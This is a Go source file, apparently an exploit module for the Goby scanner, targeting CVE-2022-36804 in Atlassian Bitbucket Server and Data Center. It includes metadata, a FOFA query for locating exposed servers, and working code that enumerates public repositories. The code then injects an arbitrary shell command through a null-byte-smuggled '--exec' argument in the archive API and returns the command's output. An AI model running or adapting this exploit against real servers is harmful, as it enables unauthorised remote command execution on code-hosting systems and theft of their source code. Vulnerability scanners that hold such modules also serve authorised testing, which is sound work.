package exploits

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Atlassian Bitbucket Server and Data Center Command Injection Vulnerabilities (CVE-2022-36804)",
    "Description": "<p>Atlassian Bitbucket Server is a Git code hosting solution from Atlassian in Australia. The solution manages and reviews code with capabilities such as differential views, JIRA integration, and build integration.</p><p>Command injection vulnerabilities exist in multiple API endpoints of Atlassian Bitbucket Server and Data Center that could execute arbitrary code by sending malicious HTTP requests with read access to public or private Bitbucket repositories.</p>",
    "Impact": "<p>Atlassian Bitbucket Server and Data Center Command Injection Vulnerabilities (CVE-2022-36804)</p>",
    "Recommendation": "<p>At present, the manufacturer has issued an upgrade patch to fix the vulnerability, please update the product in time: <a href=\"https://jira.atlassian.com/browse/BSERV-13438\">https://jira.atlassian.com/browse/BSERV-13438</a></p>",
    "Product": "Bitbucket",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Atlassian Bitbucket Server 和 Data Center命令注入漏洞（CVE-2022-36804）",
            "Product": "ATLASSIAN-Bitbucket",
            "Description": "<p>Atlassian Bitbucket Server是澳大利亚Atlassian公司的一款Git代码托管解决方案。该方案能够管理并审查代码，具有差异视图、JIRA集成和构建集成等功能。</p><p>Atlassian Bitbucket Server 和 Data Center的多个API端点中存在命令注入漏洞，可在对公共或私有Bitbucket储存库具有读取权限的情况下，通过发送恶意的HTTP请求执行任意代码。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，请用户及时更新产品：<a target=\"_Blank\" href=\"https://jira.atlassian.com/browse/BSERV-13438\">https://jira.atlassian.com/browse/BSERV-13438</a></p>",
            "Impact": "<p>Atlassian Bitbucket Server 和 Data Center的多个API端点中存在命令注入漏洞，可在对公共或私有Bitbucket储存库具有读取权限的情况下，通过发送恶意的HTTP请求执行任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Atlassian Bitbucket Server and Data Center Command Injection Vulnerabilities (CVE-2022-36804)",
            "Product": "Bitbucket",
            "Description": "<p>Atlassian Bitbucket Server is a Git code hosting solution from Atlassian in Australia. The solution manages and reviews code with capabilities such as differential views, JIRA integration, and build integration.</p><p>Command injection vulnerabilities exist in multiple API endpoints of Atlassian Bitbucket Server and Data Center that could execute arbitrary code by sending malicious HTTP requests with read access to public or private Bitbucket repositories.</p>",
            "Recommendation": "<p>At present, the manufacturer has issued an upgrade patch to fix the vulnerability, please update the product in time: <a href=\"https://jira.atlassian.com/browse/BSERV-13438\" target=\"_blank\">https://jira.atlassian.com/browse/BSERV-13438</a><br></p>",
            "Impact": "<p>Atlassian Bitbucket Server and Data Center Command Injection Vulnerabilities (CVE-2022-36804)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"Bitbucket\" || (body=\"/j_atl_security_check\" && body=\"bitbucket.page.login\")",
    "GobyQuery": "title=\"Bitbucket\" || (body=\"/j_atl_security_check\" && body=\"bitbucket.page.login\")",
    "Author": "featherstark@outlook.com",
    "Homepage": "https://bitbucket.org/",
    "DisclosureDate": "2022-08-25",
    "References": [
        "https://jira.atlassian.com/browse/BSERV-13438"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [
        "CVE-2022-36804"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202208-3859"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Cookie",
            "type": "input",
            "value": "_atl_bitbucket_remember_me=YTcyODFmOTE5YWFjYjgyOGYxODg4NTE0YTJmNDE4Y2I5YTFmNWI3Yjo0NjIyYjE0Zjc4ZGQ0ZDY0YmM3MGQzZTQ0NTRiYTRkMWRjNzE1MTM1; BITBUCKETSESSIONID=6292DC65A012887D2554383D3FDFCF3A",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "8.8",
    "PocId": "10667"
}`

	exploitArchive34242252 := func(u *httpclient.FixUrl, key string, repository string, command string, cookie string) string {
		if key != "" && repository != "" && command != "" {
			cfg := httpclient.NewGetRequestConfig("/rest/api/latest/projects/" + key + "/repos/" + repository + "/archive?&prefix=ax%00--exec=%60" + url.QueryEscape(command) + "%60%00--remote=origin")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if cookie != "" {
				cfg.Header.Store("Cookie", cookie)
			}
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				m := regexp.MustCompile(`n/': 1: (.*?): not found\\nfatal:`).FindStringSubmatch(resp.RawBody)
				if len(m) > 0 {
					return m[1]
				}
				return resp.Utf8Html
			}
		}
		return ""
	}
	getPublicRepository1230897842 := func(u *httpclient.FixUrl, cookie string) map[string]string {
		cfg := httpclient.NewGetRequestConfig("/rest/api/latest/repos")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if cookie != "" {
			cfg.Header.Store("Cookie", cookie)
		}
		publicRepositoryMap := make(map[string]string)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "project") {
				var d map[string]interface{}
				if json.Unmarshal([]byte(resp.Utf8Html), &d) == nil {
					values, _ := d["values"].([]interface{})
					for i := range values {
						value, _ := values[i].(map[string]interface{})
						repositoryName := value["slug"].(string)
						project, _ := value["project"].(map[string]interface{})
						projectName := project["key"].(string)
						publicRepositoryMap[projectName] = repositoryName
					}
				}
			}
		}
		return publicRepositoryMap
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resultMap := getPublicRepository1230897842(u, "")
			for k, v := range resultMap {
				rand := goutils.RandomHexString(5)
				result := exploitArchive34242252(u, k, v, "echo -n "+rand+"|md5sum", "")
				if strings.Contains(result, fmt.Sprintf("%x", md5.Sum([]byte(rand)))) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cookie := ss.Params["Cookie"].(string)
			command := ss.Params["Command"].(string)
			resultMap := getPublicRepository1230897842(expResult.HostInfo, cookie)
			for k, v := range resultMap {
				result := exploitArchive34242252(expResult.HostInfo, k, v, command, cookie)
				if result != "" {
					expResult.Success = true
					expResult.Output = result
					return expResult
				}
			}
			return expResult
		},
	))
}
